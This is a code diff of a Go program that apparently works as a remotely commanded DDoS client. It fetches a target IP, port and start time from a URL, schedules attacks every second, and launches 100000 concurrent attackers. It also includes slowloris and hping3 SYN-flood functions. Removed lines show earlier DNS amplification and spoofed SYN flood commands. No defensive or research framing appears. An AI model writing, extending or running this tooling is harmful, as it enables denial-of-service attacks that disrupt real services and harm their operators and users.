@@ -7,11 +7,13 @@ import (
 	"math/rand"
 	"net/http"
 	"os/exec"
+
 	//"strings"
-	"sync"
 	"net"
-	"os"
+	//"os"
+	"sync"
 	"time"
+
 	"github.com/jasonlvhit/gocron"
 )
 
@@ -26,7 +28,6 @@ var choice = []string{
 	"User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\r\n",
 	"User-agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0\r\n",
 }
-
 
 type AttackInfo struct {
 	Ip     string
@@ -62,64 +63,26 @@ func checkDDoS() {
 		fmt.Println(err)
 	} else {
 		fmt.Println(attackInfo)
-		cronAttackDDoS(attackInfo.Ip, attackInfo.Date, attackInfo.DateNs)
+		cronAttackDDoS(attackInfo.Ip, attackInfo.Port, attackInfo.Date, attackInfo.DateNs)
 	}
 }
 
-func cronAttackDDoS(ip string, date string, dateNs int64) {
+func cronAttackDDoS(ip string, port string, date string, dateNs int64) {
 	scheduler := gocron.NewScheduler()
 
 	// Begin job at a specific date/time
 	t := time.Unix(0, dateNs)
-	scheduler.Every(1).Second().From(&t).Do(attackDDoS, ip)
+	scheduler.Every(1).Second().From(&t).Do(attackDDoS, ip, port)
 
 	//fmt.Println(ip + " attack scheduled")
 
 	<-scheduler.Start()
 }
 
-func attackDDoS(ip string) {
-	//x := randomNumber()
-	//fmt.Println(x)
-	
-	_,err := exec.Command("/bin/ping", "-c1", ip).Output()
-	if err != nil {
-		log.Fatal(err)
-	}
-	//fmt.Println(string(out))
-	/*
-	switch x {
-	case 1:
-		fmt.Println("------------------------Starting Slowloris Attack------------------------")
-		out, err := exec.Command("./slowloris", ip).Output()
-		if err != nil {
-			log.Fatal(err)
-		}
-		fmt.Println(string(out))
-	case 2:
-		fmt.Println("------------------------Starting DNS Amplification Attack------------------------")
-		out, err := exec.Command("./dnsdrdos.o", "-f", "./DNSlist.txt", "-s", strings.Split(ip, ":")[0], "-l", "10000000").Output()
-		if err != nil {
-			log.Fatal(err)
-		}
-		fmt.Println(string(out))
-	case 3:
-		fmt.Println("------------------------Starting TCP SYN Attack------------------------")
-		out, err := exec.Command("hping3", "--syn", strings.Split(ip, ":")[0], "-p", "9999", "--flood", "--spoof", "10.0.0.1").Output()
-		if err != nil {
-			log.Fatal(err)
-		}
-		fmt.Println(string(out))
-	}
-	*/
+func attackDDoS(ip string, port string) {
+	ddosmain(ip + ":" + port)
+//	slowloris(ip + ":" + port)
 }
-
-/*func randomNumber() int {
-	rand.Seed(time.Now().UnixNano())
-	min := 1
-	max := 3
-	return rand.Intn(max-min+1) + min
-}*/
 
 func getAttackInfo(url string, target interface{}) error {
 	resp, err := http.Get(url)
@@ -131,7 +94,6 @@ func getAttackInfo(url string, target interface{}) error {
 	return json.NewDecoder(resp.Body).Decode(target)
 }
 
-//-------------
 func slowloris(url string) {
 	conn, err := net.DialTimeout("tcp", url, 2*time.Second)
 	if err != nil {
@@ -151,10 +113,9 @@ func slowloris(url string) {
 	}
 }
 
-func ddosmain() {
+func ddosmain(url string) {
 	attackers := 100000
-	url := os.Args[1]
-	x := randomNumber()
+	x := randomNumber(15)
 	fmt.Print("Waiting: ", x)
 	time.Sleep(time.Duration(x) * time.Second)
 	for {
@@ -166,10 +127,15 @@ func ddosmain() {
 	}
 }
 
-func randomNumber() int {
-	rand.Seed(time.Now().UnixNano())
-	min := 1
-	max := 15
-	return rand.Intn(max-min+1) + min
+func hping3(ip string, port string) {
+	_, err := exec.Command("hping3", "--syn", ip, "-p", port, "--flood").Output()
+	if err != nil {
+		log.Fatal(err)
+	}
 }
 
+func randomNumber(max int) int {
+	rand.Seed(time.Now().UnixNano())
+	min := 1
+	return rand.Intn(max-min+1) + min
+}
